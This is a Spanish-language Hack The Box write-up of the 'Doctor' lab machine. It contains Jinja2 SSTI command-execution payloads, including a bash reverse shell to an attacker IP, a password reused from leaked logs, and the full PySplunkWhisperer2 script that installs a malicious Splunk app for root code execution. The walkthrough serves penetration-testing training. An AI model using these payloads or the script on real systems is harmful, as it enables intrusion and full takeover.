---
layout: single
title: Doctor - Hack The Box
excerpt: "Una máquina muy interesante, en la cual nos aprovechamos de una vulnerabilidad llamada *Server Side Template Injection* para la intrusión inicial, y de una mala configuración en splunkd para la escalada de privilegios."
date: 2021-02-07
classes: wide
header:
  teaser: /assets/images/Doctor-Hackthebox/doctor-hackthebox.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - Web Exploiting
  - Privilege Escalation
  - Python
  - Pentesting
---


![](/assets/images/Doctor-Hackthebox/doctor-hackthebox.png)

Una máquina muy interesante, en la cual nos aprovechamos de una vulnerabilidad llamada Server Side Template Injection para la intrusión inicial, y de una mala configuración en splunkd para la escalada de privilegios.

## Escaneo de puertos

Empezamos haciendo un escaneo de puertos con nmap. Vemos que están abiertos los puertos 22, 80 y 8089 que corresponden a los servicios SSH, Apache y Splunkd respectívamente.

![](/assets/images/Doctor-Hackthebox/nmap-doctor.png)

Accedo a la página web a través de la ip.

![](/assets/images/Doctor-Hackthebox/doctor-home.png)

VIendo la página principal veo que hay una dirección de email info@doctors.htb, así que añado doctors.htb a mi fichero hosts para que resuelva el dominio y obtengo un panel login.

![](/assets/images/Doctor-Hackthebox/doctor-login.png)

Me registro en la página y veo que se pueden postear mensajes, y además en el código fuente de la página el desarrollador ha dejado un comentario que dice que la página archive está en fase beta.

![](/assets/images/Doctor-Hackthebox/doctor-beta.png)

Viendo la página http://doctors.htb/archive aparece en blanco, pero en el código fuente se ve que recoge como parámetro lo que se ponga en el título del mensaje que se postea.
Con wappalizer veo que la web utiliza el lenguaje python y la tecnología flask.
Busco información acerca de como explotar flask y encuentro lo siguiente:

[https://www.exploit-db.com/exploits/46386](https://www.exploit-db.com/exploits/46386)<br>
[https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)<br>
[https://www.onsecurity.co.uk/blog/server-side-template-injection-with-jinja2/](https://www.onsecurity.co.uk/blog/server-side-template-injection-with-jinja2/)<br>

Parece ser que se puede explotar una vulnerabilidad llamada `Server Side Template Injection`.
Éstos links ayudan a entender la vulnerabilidad, y en el último link veo que se pueden ejecutar comandos con ésta inyección:
```python
\{\{request.application.__globals__.__builtins__.__import__('os').popen('id').read()\}\}
```
Creo un mensaje que contenga la inyección en el título

![](/assets/images/Doctor-Hackthebox/doctor-inyeccion.png)

Y accedo a la página archive, y en el código fuente aparece lo siguiente:

![](/assets/images/Doctor-Hackthebox/doctor-comandos.png)

Tengo ejecución de comandos!
Cambio el título y pongo lo siguiente para la reverse shell:

```python
\{\{request.application.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.15.94/4444 0>&1'").read()\}\}
```
![](/assets/images/Doctor-Hackthebox/doctor-reverse.png)

Y al acceder a la página archive obtengo la shell :)

![](/assets/images/Doctor-Hackthebox/doctor-shell.png)

Ejecuto linPEAS.sh y veo lo siguiente:

/var/log/apache2/backup:10.10.14.4 - -
[05/Sep/2020:11:17:34 +2000] "POST /reset_password?
email=Guitar123" 500 453 "http://doctor.htb/reset_password"

Pruebo esa contraseña con el usuario shaun, que había visto anteriormente listando el contenido de /home y funciona!

su shaun<br>
password: Guitar123

Ya puedo leer el user.txt en el home de shaun.

Como aún no hemos tocado para nada el servicio en le puerto 8089 (splunk) intuyo que la escalada de privilegios al root debe de ir por ahí.
Buscando en internet por “splunk privilege escalation” encuentro esto:

[https://github.com/cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)

Me descargo la versión python para ejecución remota de esta forma:

`wget https://raw.githubusercontent.com/cnotin/SplunkWhisperer2/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py`

Viendo la página del proyecto observo que por defecto se ejecuta un calc.exe como payload. Lo cambio por una reverse shell en bash de pentestmonkey así:

![](/assets/images/Doctor-Hackthebox/doctor-monkey.png)

Éste es el código:

```python
import sys, os, tempfile, shutil
import tarfile
import requests
import socketserver
from http.server import SimpleHTTPRequestHandler
import argparse
import threading

requests.packages.urllib3.disable_warnings(category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

SPLUNK_APP_NAME = '_PWN_APP_'


def create_splunk_bundle(options):
    tmp_path = tempfile.mkdtemp()
    os.mkdir(os.path.join(tmp_path, SPLUNK_APP_NAME))

    bin_dir = os.path.join(tmp_path, SPLUNK_APP_NAME, "bin")
    os.mkdir(bin_dir)
    pwn_file = os.path.join(bin_dir, options.payload_file)
    open(pwn_file, "w").write(options.payload)
    # make the script executable - not 100% certain this makes a difference
    os.chmod(pwn_file, 0o700)

    local_dir = os.path.join(tmp_path, SPLUNK_APP_NAME, "local")
    os.mkdir(local_dir)
    inputs_conf = os.path.join(local_dir, "inputs.conf")
    with open(inputs_conf, "w") as f:
        inputs = '[script://$SPLUNK_HOME/etc/apps/{}/bin/{}]\n'.format(SPLUNK_APP_NAME, options.payload_file)
        inputs += 'disabled = false\n'
        inputs += 'index = default\n'
        inputs += 'interval = 60.0\n'
        inputs += 'sourcetype = test\n'
        f.write(inputs)

    (fd, tmp_bundle) = tempfile.mkstemp(suffix='.tar')
    os.close(fd)
    with tarfile.TarFile(tmp_bundle, mode="w") as tf:
        tf.add(os.path.join(tmp_path, SPLUNK_APP_NAME), arcname=SPLUNK_APP_NAME)

    shutil.rmtree(tmp_path)
    return tmp_bundle


class CustomHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        global BUNDLE_FILE
        bundle = open(BUNDLE_FILE, 'rb').read()

        self.send_response(200)
        self.send_header('Expires', 'Thu, 26 Oct 1978 00:00:00 GMT')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Content-type', 'application/tar')
        self.send_header('Content-Disposition', 'attachment; filename="splunk_bundle.tar"')
        self.send_header('Content-Length', len(bundle))
        self.end_headers()

        self.wfile.write(bundle)


class ThreadedHTTPServer(object):
    """Runs SimpleHTTPServer in a thread
    Lets you start and stop an instance of SimpleHTTPServer.
    """

    def __init__(self, host, port, request_handler=SimpleHTTPRequestHandler):
        """Prepare thread and socket server
        Creates the socket server that will use the HTTP request handler. Also
        prepares the thread to run the serve_forever method of the socket
        server as a daemon once it is started
        """
        socketserver.TCPServer.allow_reuse_address = True
        self.server = socketserver.TCPServer((host, int(port)), request_handler)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()

    def stop(self):
        """Stop the HTTP server
        Stops the server and cleans up the port assigned to the socket
        """
        self.server.shutdown()
        self.server.server_close()


parser = argparse.ArgumentParser()
parser.add_argument('--scheme', default="https")
parser.add_argument('--host', required=True)
parser.add_argument('--port', default=8089)
parser.add_argument('--lhost', required=True)
parser.add_argument('--lport', default=8181)
parser.add_argument('--username', default="admin")
parser.add_argument('--password', default="changeme")
parser.add_argument('--payload', default="calc.exe")
parser.add_argument('--payload-file', default="pwn.bat")
options = parser.parse_args()

print("Running in remote mode (Remote Code Execution)")

SPLUNK_BASE_API = "{}://{}:{}/services/apps/local/".format(options.scheme, options.host, options.port, )

s = requests.Session()
s.auth = requests.auth.HTTPBasicAuth(options.username, options.password)
s.verify = False

print("[.] Authenticating...")
req = s.get(SPLUNK_BASE_API)
if req.status_code == 401:
    print("Authentication failure")
    print("")
    print(req.text)
    sys.exit(-1)
print("[+] Authenticated")

print("[.] Creating malicious app bundle...")
BUNDLE_FILE = create_splunk_bundle(options)
print("[+] Created malicious app bundle in: " + BUNDLE_FILE)

httpd = ThreadedHTTPServer(options.lhost, options.lport, request_handler=CustomHandler)
print("[+] Started HTTP server for remote mode")

lurl = "http://{}:{}/".format(options.lhost, options.lport)

print("[.] Installing app from: " + lurl)
req = s.post(SPLUNK_BASE_API, data={'name': lurl, 'filename': True, 'update': True})
if req.status_code != 200 and req.status_code != 201:
    print("Got a problem: " + str(req.status_code))
    print("")
    print(req.text)
print("[+] App installed, your code should be running now!")

print("\nPress RETURN to cleanup")
input()
os.remove(BUNDLE_FILE)

print("[.] Removing app...")
req = s.delete(SPLUNK_BASE_API + SPLUNK_APP_NAME)
if req.status_code != 200 and req.status_code != 201:
    print("Got a problem: " + str(req.status_code))
    print("")
    print(req.text)
print("[+] App removed")

httpd.stop()
print("[+] Stopped HTTP server")

print("Bye!")
```
Se puede poner el host, port, username y password o también se le pueden pasar como argumento al script.
Me pongo a la escucha y ejecuto el script para recibir la shell.

`python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.15.105 --username shaun --password Guitar123`

![](/assets/images/Doctor-Hackthebox/doctor-root.png)

Ya puedo leer el root.txt
